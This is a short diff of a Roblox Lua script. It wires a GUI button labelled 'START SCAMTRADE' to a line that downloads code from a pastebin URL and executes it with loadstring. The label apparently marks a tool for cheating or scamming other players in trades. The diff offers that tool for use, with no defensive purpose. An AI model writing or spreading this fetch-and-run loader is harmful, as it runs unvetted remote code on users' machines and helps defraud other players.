@@ -55,4 +55,4 @@ TextButton.Text = "START SCAMTRADE"
 TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextSize = 30.000
 TextButton.MouseButton1Down:connect(function()
-https://pastebin.com/edit/mqPz1Xz1
+loadstring(game:HttpGet('https://pastebin.com/raw/mqPz1Xz1'))()
